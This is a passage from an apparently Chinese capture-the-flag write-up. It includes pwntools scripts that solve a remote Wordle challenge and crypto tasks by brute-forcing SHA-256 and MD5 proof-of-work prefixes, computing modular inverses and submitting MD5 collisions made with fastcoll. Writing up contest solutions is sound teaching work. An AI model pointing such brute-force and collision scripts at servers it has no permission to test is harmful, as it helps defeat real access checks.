class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> <span class="type">Sequence</span>, Mapping, Iterable</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line">ALL_LETTERS = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line">GREEN = <span class="string">&#x27;\x1b[42m  \x1b[0m&#x27;</span></span><br><span class="line">YELLOW = <span class="string">&#x27;\x1b[43m  \x1b[0m&#x27;</span></span><br><span class="line">WHITE = <span class="string">&#x27;\x1b[47m  \x1b[0m&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WordleSolver</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, wordlen: <span class="built_in">int</span> = <span class="number">5</span>, dictfile_solutions: <span class="built_in">str</span> = <span class="string">&#x27;./valid_words.txt&#x27;</span>, dictfile_guesses: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="string">&#x27;./allowed_guesses.txt&#x27;</span>, allow_dup_letters: <span class="built_in">bool</span> = <span class="literal">True</span>, hard_mode: <span class="built_in">bool</span> = <span class="literal">False</span>, const_first_guess: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="string">&#x27;salet&#x27;</span></span>):</span><br><span class="line">        self.wordlen = wordlen</span><br><span class="line">        self.hard_mode = hard_mode</span><br><span class="line">        self.all_solution_words = self._load_words(dictfile_solutions, allow_dup_letters)</span><br><span class="line">        <span class="keyword">if</span> dictfile_guesses == <span class="literal">None</span>:</span><br><span class="line">            self.all_guess_words = self.all_solution_words.copy()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.all_guess_words = self._load_words(dictfile_guesses, allow_dup_letters)</span><br><span class="line">        self._fast_word_result_buf = array(<span class="string">&#x27;b&#x27;</span>, [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>) ])</span><br><span class="line">        self.const_first_guess = const_first_guess</span><br><span class="line">        self.reset()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_load_words</span>(<span class="params">self, dictfile: <span class="built_in">str</span>, allow_dup_letters: <span class="built_in">bool</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(dictfile, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            all_words = [ line.lower().strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> re.fullmatch(<span class="string">r&#x27;[a-z]+&#x27;</span>, line.strip()) ]</span><br><span class="line">        all_words = [ word <span class="keyword">for</span> word <span class="keyword">in</span> all_words <span class="keyword">if</span> <span class="built_in">len</span>(word) == self.wordlen ]</span><br><span class="line">        all_words = <span class="built_in">list</span>(<span class="built_in">set</span>(all_words))</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">has_dup_letters</span>(<span class="params">word</span>):</span><br><span class="line">            letterset = <span class="built_in">set</span>()</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> word:</span><br><span class="line">                <span class="keyword">if</span> l <span class="keyword">in</span> letterset:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                letterset.add(l)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> allow_dup_letters:</span><br><span class="line">            all_words = [ word <span class="keyword">for</span> word <span class="keyword">in</span> all_words <span class="keyword">if</span> <span class="keyword">not</span> has_dup_letters(word) ]</span><br><span class="line">        <span class="keyword">return</span> all_words</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_letter_counts</span>(<span class="params">word: <span class="built_in">str</span>, all_letters: <span class="built_in">bool</span> = <span class="literal">False</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]:</span><br><span class="line">        r = &#123; l : <span class="number">0</span> <span class="keyword">for</span> l <span class="keyword">in</span> ALL_LETTERS &#125; <span class="keyword">if</span> all_letters <span class="keyword">else</span> &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> word:</span><br><span class="line">            r[l] = r.get(l, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_letter_count_ranges_of_words</span>(<span class="params">words: <span class="type">Sequence</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]]:</span><br><span class="line">        r = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            <span class="keyword">for</span> letter, count <span class="keyword">in</span> WordleSolver._get_letter_counts(word, <span class="literal">True</span>).items():</span><br><span class="line">                <span class="keyword">if</span> letter <span class="keyword">in</span> r:</span><br><span class="line">                    c = r[letter]</span><br><span class="line">                    <span class="keyword">if</span> count &lt; c[<span class="number">0</span>]:</span><br><span class="line">                        c = (count, c[<span class="number">1</span>])</span><br><span class="line">                    <span class="keyword">if</span> count &gt; c[<span class="number">1</span>]:</span><br><span class="line">                        c = (c[<span class="number">0</span>], count)</span><br><span class="line">                    r[letter] = c</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r[letter] = (count, count)</span><br><span class="line">        <span class="keyword">for</span> letter <span class="keyword">in</span> ALL_LETTERS:</span><br><span class="line">            <span class="keyword">if</span> letter <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">                r[letter] = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.positions = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.wordlen):</span><br><span class="line">            self.positions.append(<span class="built_in">set</span>(ALL_LETTERS))</span><br><span class="line">        self.letter_counts = WordleSolver._get_letter_count_ranges_of_words(self.all_solution_words)</span><br><span class="line">        self.tried_words = <span class="built_in">set</span>()</span><br><span class="line">        self.tried_word_list = []</span><br><span class="line">        self.potential_solutions = <span class="built_in">set</span>(self.all_solution_words)</span><br><span class="line">        self.solved = <span class="literal">False</span></span><br><span class="line">        self.first_word_queue = [ self.const_first_guess ] <span class="keyword">if</span> self.const_first_guess <span class="keyword">and</span> self.const_first_guess <span class="keyword">in</span> self.all_guess_words <span class="keyword">else</span> []</span><br><span class="line">        self.potential_guesses = <span class="built_in">set</span>(self.all_guess_words)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_fast_word_result</span>(<span class="params">self, guess: <span class="built_in">str</span>, target: <span class="built_in">str</span></span>):</span><br><span class="line">        retval = <span class="number">0</span></span><br><span class="line">        target_lcounts = self._fast_word_result_buf</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.wordlen):</span><br><span class="line">            target_lcounts[<span class="built_in">ord</span>(target[i])] += <span class="number">1</span></span><br><span class="line">        placeval = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.wordlen):</span><br><span class="line">            <span class="keyword">if</span> guess[i] == target[i]:</span><br><span class="line">                retval += placeval * <span class="number">2</span></span><br><span class="line">                target_lcounts[<span class="built_in">ord</span>(target[i])] -= <span class="number">1</span></span><br><span class="line">            placeval *= <span class="number">3</span></span><br><span class="line">        placeval = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.wordlen):</span><br><span class="line">            g = guess[i]</span><br><span class="line">            t = target[i]</span><br><span class="line">            ordg = <span class="built_in">ord</span>(g)</span><br><span class="line">            <span class="keyword">if</span> g != t <span class="keyword">and</span> target_lcounts[ordg] &gt; <span class="number">0</span>:</span><br><span class="line">                retval += placeval</span><br><span class="line">                target_lcounts[ordg] -= <span class="number">1</span></span><br><span class="line">            placeval *= <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.wordlen):</span><br><span class="line">            target_lcounts[<span class="built_in">ord</span>(target[i])] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> retval</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, guessed_word: <span class="built_in">str</span>, result: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">len</span>(guessed_word) == self.wordlen)</span><br><span class="line">        <span class="comment"># assert(len(result) == self.wordlen)</span></span><br><span class="line">        <span class="comment"># assert(re.fullmatch(r&#x27;[CLX]+&#x27;, result))</span></span><br><span class="line">        guess_lcounts = WordleSolver._get_letter_counts(guessed_word, <span class="literal">True</span>)</span><br><span class="line">        result_lcounts = &#123; l : <span class="number">0</span> <span class="keyword">for</span> l <span class="keyword">in</span> ALL_LETTERS &#125;</span><br><span class="line">        <span class="keyword">for</span> letter, rchar <span class="keyword">in</span> <span class="built_in">zip</span>(guessed_word, result):</span><br><span class="line">            <span class="keyword">if</span> rchar == <span class="string">&#x27;C&#x27;</span> <span class="keyword">or</span> rchar == <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">                result_lcounts[letter] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> letter <span class="keyword">in</span> guess_lcounts:</span><br><span class="line">            gc = guess_lcounts[letter]</span><br><span class="line">            rc = result_lcounts[letter]</span><br><span class="line">            crange = self.letter_counts[letter]</span><br><span class="line">            <span class="keyword">assert</span>(gc &gt;= rc)</span><br><span class="line">            <span class="keyword">if</span> gc &gt; rc:</span><br><span class="line">                crange = (rc, rc)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                crange = (rc, crange[<span class="number">1</span>])</span><br><span class="line">            self.letter_counts[letter] = crange</span><br><span class="line">        <span class="keyword">for</span> i, (letter, rchar) <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">zip</span>(guessed_word, result)):</span><br><span class="line">            <span class="keyword">if</span> rchar == <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">                self.positions[i] = <span class="built_in">set</span>([ letter ])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.positions[i].discard(letter)</span><br><span class="line">        lbound_sum = <span class="built_in">sum</span>(( lbound <span class="keyword">for</span> lbound, ubound <span class="keyword">in</span> self.letter_counts.values() ))</span><br><span class="line">        <span class="keyword">if</span> lbound_sum &gt;= self.wordlen:</span><br><span class="line">            self.letter_counts = &#123; letter : ( lbound, lbound ) <span class="keyword">for</span> letter, (lbound, ubound) <span class="keyword">in</span> self.letter_counts.items() &#125;</span><br><span class="line">        <span class="keyword">for</span> letter, (lbound, ubound) <span class="keyword">in</span> self.letter_counts.items():</span><br><span class="line">            nexclusive = <span class="built_in">sum</span>(( <span class="number">1</span> <span class="keyword">if</span> letter <span class="keyword">in</span> lset <span class="keyword">and</span> <span class="built_in">len</span>(lset) == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> lset <span class="keyword">in</span> self.positions ))</span><br><span class="line">            <span class="keyword">if</span> nexclusive &gt;= ubound:</span><br><span class="line">                <span class="keyword">for</span> lset <span class="keyword">in</span> self.positions:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (letter <span class="keyword">in</span> lset <span class="keyword">and</span> <span class="built_in">len</span>(lset) == <span class="number">1</span>):</span><br><span class="line">                        lset.discard(letter)</span><br><span class="line">        self.tried_words.add(guessed_word)</span><br><span class="line">        self.tried_word_list.append(guessed_word)</span><br><span class="line">        self._filter_words_by_known_info(self.potential_solutions)</span><br><span class="line">        <span class="keyword">if</span> self.hard_mode:</span><br><span class="line">            self._filter_words_by_known_info(self.potential_guesses)</span><br><span class="line">        self.letter_counts = WordleSolver._get_letter_count_ranges_of_words(<span class="built_in">list</span>(self.potential_solutions))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="string">&#x27;C&#x27;</span> * self.wordlen:</span><br><span class="line">            self.solved = <span class="literal">True</span></span><br><span class="line">            self.potential_solutions = <span class="built_in">set</span>([ guessed_word ])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_filter_words_by_known_info</span>(<span class="params">self, words: <span class="built_in">set</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        regex_str = <span class="string">&#x27;&#x27;</span>.join([</span><br><span class="line">            <span class="string">&#x27;[&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(letterset)) + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> letterset <span class="keyword">in</span> self.positions</span><br><span class="line">        ])</span><br><span class="line">        rx = re.<span class="built_in">compile</span>(regex_str)</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">word_within_bounds</span>(<span class="params">word</span>):</span><br><span class="line">            lcounts = WordleSolver._get_letter_counts(word, <span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">for</span> letter, lcount <span class="keyword">in</span> lcounts.items():</span><br><span class="line">                lbound, ubound = self.letter_counts[letter]</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (lbound &lt;= lcount &lt;= ubound):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> <span class="built_in">list</span>(words):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (rx.fullmatch(word) <span class="keyword">and</span> word <span class="keyword">not</span> <span class="keyword">in</span> self.tried_words <span class="keyword">and</span> word_within_bounds(word)):</span><br><span class="line">                words.discard(word)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_guess</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.first_word_queue):</span><br><span class="line">            <span class="keyword">return</span> self.first_word_queue.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.potential_solutions) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Answer unknown&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(self.potential_solutions) &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">list</span>(self.potential_solutions)[<span class="number">0</span>]</span><br><span class="line">        best_word = <span class="literal">None</span></span><br><span class="line">        best_score = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> self.potential_guesses:</span><br><span class="line">            solution_group_counts: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">int</span>] = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> potsol <span class="keyword">in</span> self.potential_solutions:</span><br><span class="line">                resstr = self._fast_word_result(word, potsol)</span><br><span class="line">                solution_group_counts[resstr] = solution_group_counts.get(resstr, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">            avg_expected_group_size = <span class="built_in">sum</span>(( s * s <span class="keyword">for</span> s <span class="keyword">in</span> solution_group_counts.values() )) / <span class="built_in">sum</span>(( s <span class="keyword">for</span> s <span class="keyword">in</span> solution_group_counts.values() ))</span><br><span class="line">            word_score = avg_expected_group_size</span><br><span class="line">            <span class="keyword">if</span> word <span class="keyword">in</span> self.potential_solutions:</span><br><span class="line">                word_score -= <span class="number">0.01</span></span><br><span class="line">            <span class="keyword">if</span> word_score &lt; best_score <span class="keyword">or</span> best_score == -<span class="number">1</span>:</span><br><span class="line">                best_score = word_score</span><br><span class="line">                best_word = word</span><br><span class="line">        <span class="keyword">return</span> best_word</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_word_result</span>(<span class="params">guess: <span class="built_in">str</span>, target: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        r_list = [ <span class="string">&#x27;X&#x27;</span> ] * <span class="built_in">len</span>(target)</span><br><span class="line">        target_lcounts = WordleSolver._get_letter_counts(target, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> i, (guess_letter, target_letter) <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">zip</span>(guess, target)):</span><br><span class="line">            <span class="keyword">if</span> guess_letter == target_letter:</span><br><span class="line">                r_list[i] = <span class="string">&#x27;C&#x27;</span></span><br><span class="line">                target_lcounts[target_letter] -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i, (guess_letter, target_letter) <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">zip</span>(guess, target)):</span><br><span class="line">            <span class="keyword">if</span> guess_letter != target_letter <span class="keyword">and</span> target_lcounts[guess_letter] &gt; <span class="number">0</span>:</span><br><span class="line">                r_list[i] = <span class="string">&#x27;L&#x27;</span></span><br><span class="line">                target_lcounts[guess_letter] -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(r_list)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_auto</span>(<span class="params">self, target_word: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        self.reset()</span><br><span class="line">        nguesses = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            nguesses += <span class="number">1</span></span><br><span class="line">            guess = self.get_guess()</span><br><span class="line">            <span class="keyword">if</span> guess == target_word: <span class="keyword">break</span></span><br><span class="line">            res = WordleSolver.get_word_result(guess, target_word)</span><br><span class="line">            self.update(guess, res)</span><br><span class="line">        <span class="keyword">return</span> nguesses</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    nc = remote(<span class="string">&quot;101.43.185.64&quot;</span>,<span class="number">65100</span>)</span><br><span class="line">    r = nc.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    after = <span class="built_in">str</span>(r[<span class="number">12</span>:<span class="number">24</span>])[<span class="number">2</span>:<span class="number">14</span>]</span><br><span class="line">    value = <span class="built_in">str</span>(r[<span class="number">29</span>:<span class="number">93</span>].strip())[<span class="number">2</span>:<span class="number">66</span>]</span><br><span class="line">    alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> alphabet:</span><br><span class="line">                    <span class="keyword">if</span> sha256((i+j+k+l+after).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest() == value:</span><br><span class="line">                        nc.sendline((i+j+k+l).encode())</span><br><span class="line">    <span class="built_in">print</span>(nc.recv(<span class="number">1024</span>))</span><br><span class="line">    nc.sendline(<span class="string">&quot;0&quot;</span>.encode()) <span class="comment"># 可以选择难度为0,1,2,3</span></span><br><span class="line">    <span class="built_in">print</span>(nc.recv(<span class="number">1024</span>))</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    iden = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;<span class="number">128</span>):</span><br><span class="line">        solver = WordleSolver()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            guess = solver.get_guess()</span><br><span class="line">            <span class="built_in">print</span>(guess)</span><br><span class="line">            nc.sendline(guess.encode())</span><br><span class="line">            tmp=nc.recvline()</span><br><span class="line">            tmp=tmp.replace(GREEN.encode(),<span class="string">&quot;C&quot;</span>.encode())</span><br><span class="line">            tmp=tmp.replace(YELLOW.encode(),<span class="string">&quot;L&quot;</span>.encode())</span><br><span class="line">            tmp=tmp.replace(WHITE.encode(),<span class="string">&quot;X&quot;</span>.encode())</span><br><span class="line">            tmp=tmp.replace(<span class="string">&quot;Correct!&quot;</span>.encode(),<span class="string">&quot;&quot;</span>.encode())</span><br><span class="line">            tmp=tmp.replace(<span class="string">&quot;Wrong!&quot;</span>.encode(),<span class="string">&quot;&quot;</span>.encode())</span><br><span class="line">            tmp=tmp.replace(<span class="string">&quot; &quot;</span>.encode(),<span class="string">&quot;&quot;</span>.encode())</span><br><span class="line">            tmp=tmp.replace(<span class="string">&quot;\n&quot;</span>.encode(),<span class="string">&quot;&quot;</span>.encode())</span><br><span class="line">            tmp=tmp.replace(<span class="string">&quot;&gt;&quot;</span>.encode(),<span class="string">&quot;&quot;</span>.encode())</span><br><span class="line">            <span class="built_in">print</span>(tmp)</span><br><span class="line">            res = tmp.decode()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;failed&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                <span class="built_in">print</span>(nc.recv(<span class="number">1024</span>))</span><br><span class="line">                iden = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(res==<span class="string">&quot;CCCCC&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(nc.recvline())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> re.fullmatch(<span class="string">r&#x27;[a-z]&#123;&#x27;</span> + <span class="built_in">str</span>(solver.wordlen) + <span class="string">&#x27;&#125; [CXL]&#123;&#x27;</span> + <span class="built_in">str</span>(solver.wordlen) + <span class="string">&#x27;&#125;&#x27;</span>, res):</span><br><span class="line">                parts = res.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                nc.sendline(parts[<span class="number">0</span>])</span><br><span class="line">                solver.update(parts[<span class="number">0</span>], parts[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                solver.update(guess, res)</span><br><span class="line">        <span class="keyword">if</span> iden == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">128</span>:</span><br><span class="line">        <span class="built_in">print</span>(nc.recv(<span class="number">1024</span>))</span><br></pre></td></tr></table></figure>
<p>难度0的award：hahahahahahaha</p>
<p>难度1的award：一个mac地址</p>
<p>难度2的award：顺序被打乱的flag</p>
<p>难度3的award：flag</p>
<p>已有的破解脚本破解wordle的平均猜词次数是3到4次，而部分单词已被证明至少需要五步才可以猜出，因此本题的难度3无法简单用脚本爆破。本题使用的脚本的最好成绩是通过70到80关，可以拿到flag的前半部分。由于flag的字符在难度2的award中全部给出，通过对剩余字符的排列和猜测就可以爆出flag的后半部分。</p>
<p>（事实上，本题使用random.shuffle()打乱flag，而mac地址是shuffle的seed）</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="pow"><a href="#pow" class="headerlink" title="pow"></a>pow</h3><p>md5爆破，写一个四重循环即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"><span class="comment"># XXXX+given = answer</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">if</span> hashlib.md5(a+b+c+d+given.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest() == answer:</span><br><span class="line">                    <span class="built_in">print</span>(a,b,c,d)</span><br></pre></td></tr></table></figure>
<h3 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h3><p>远程交互题，下载源代码分析发现一共有两关，第一关系统会给出300组(a,m)，我们计算出invmod(a,m)并传回，300组成功通过后即可拿到前半段flag。第二关是md5强碰撞，上传两个不同的x和y满足md5(x)==md5(y)。</p>
<p>第一关写简单的交互逻辑就可以通过，但是第二关卡了我比较长时间，主要是不知道远程交互的时候可以上传文件。事实上，远程交互时传输的是字节编码，因此也可以上传文件字节的编码内容。</p>
<p>使用工具fastcoll可以生成两个md5值相同但字节有细微差别的文件，传入即可得到后半段flag。</p>
<p>fastcoll：<a target="_blank" rel="noopener" href="https://www.zeroplace.cn/article.asp?id=886">https://www.zeroplace.cn/article.asp?id=886</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;101.43.185.64&quot;</span>, <span class="number">43089</span>)</span><br><span class="line"></span><br><span class="line">r = p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line">r = p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="comment">########第一关########</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>.encode())</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    s = p.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    r = p.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line">    m = findall(<span class="string">r&#x27;\d+&#x27;</span>,s.decode())</span><br><span class="line">    d = invmod(<span 